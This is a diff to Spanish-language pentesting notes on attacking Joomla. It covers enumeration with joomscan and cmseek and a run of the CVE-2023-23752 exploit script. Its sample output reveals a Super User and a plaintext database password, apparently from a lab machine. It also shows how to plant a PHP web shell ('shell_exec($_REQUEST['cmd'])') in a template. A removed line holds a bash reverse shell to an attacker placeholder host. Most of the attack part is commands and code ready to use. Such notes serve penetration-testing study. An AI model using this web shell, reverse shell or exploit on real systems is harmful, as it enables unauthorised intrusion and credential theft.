@@ -30,7 +30,9 @@ Esta herramienta además de enumerar un servidor Joomla, nos crea un reporte de 
 ```
 
 ```bash 
-❯ joomscan -u http://IP/                # Enumerar Joomla (No importa si joomla esta dentro de un dir), obtener versión
+# Obtener versión
+❯ joomscan -u http://IP/                # Enumerar Joomla (No importa si joomla esta dentro de un dir)
+
 ❯ cmseek -u http://IP/administrator/    # Enumerar el CMS (Si importa si esta dentro de un dir)
 ```
 
@@ -38,8 +40,30 @@ Esta herramienta además de enumerar un servidor Joomla, nos crea un reporte de 
 ### Forma 1
 * [CVE-2023-23752](https://www.exploit-db.com/exploits/51334)
 ```bash 
+# Instalar lo faltante 
+❯ grep "^require" CVE-2023-23752.rb | awk '{print $2}' | tr -d "'" | xargs gem install
+
 # Obtener usuario y valores de la DB
 ❯ ruby CVE-2023-23752.rb http://IP  
+
+	Users
+	[769] Oda (Miyamoto) - oda@local.local - Super Users     <- IMPORTANTE 
+	
+	Site info
+	Site name: Samurai
+	Editor: tinymce
+	Captcha: 0
+	Access: 1
+	Debug status: false
+	
+	Database info
+	DB type: mysqli
+	DB host: localhost
+	DB user: joomla425
+	DB password: Pa847word987@Joomla456                      <- IMPORTANTE 
+	DB name: Dbjoomla
+	DB prefix: iemj4_
+	DB encryption 0
 ```
 ### Forma 2
 ```bash 
@@ -79,23 +103,24 @@ NOTA:
 
 ## Obtener una Shell en Joomla
 ```bash 
-1. Para obtener una shell en Joomla, si contamos con acceso administrativo, podemos modificar un template desde 'System → Site Templates' y agregar código PHP para ejecutar comandos. Debemos identificar la ruta donde está instalado Joomla y el template, ya que podremos acceder al archivo modificado mediante una petición como '?cmd=whoami', permitiendo comprobar la ejecución de comandos y posteriormente obtener una reverse shell.
+1. Para obtener una shell en Joomla, si contamos con acceso administrativo 'Super User', podemos modificar un template desde 'System → Site Templates' y agregar código PHP para ejecutar comandos. Debemos identificar la ruta donde está instalado Joomla y el template, ya que podremos acceder al archivo modificado mediante una petición como '?cmd=whoami', permitiendo comprobar la ejecución de comandos y posteriormente obtener una reverse shell.
 ```
 
 ```bash 
 Opcion 1. Editar cualquier template 
 
 Paso 1:
-# Seleccionar un template y hacer clic en 'New File'. Asignarle el nombre 'pwned', seleccionar la extensión PHP, hacer clic en Create y, finalmente, agregar el código correspondiente. Después de colocar el contenido en PHP guardarlo. 
+# Seleccionar un template y hacer clic en 'New File'. Asignarle el nombre 'pwned', seleccionar la extensión PHP, hacer clic en Create y, finalmente, agregar el código correspondiente. Después de colocar el contenido en PHP y guardarlo. 
 
-	<?php 
-		echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
-	?>
 
-# O colocar una ReverShell directa:
+OPCIONAL:
+	<?php phpinfo(); ?>      # Colocar esto si para ver se ilas funciones estan deshabilitadas (disable_functions)
 
+RCE:
 	<?php
-	   system("bash -c 'bash -i >& /dev/tcp/IP_kali/443 0>&1'")
+	ini_set('display_errors', 1);
+	error_reporting(E_ALL);
+	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
 	?>
 
 
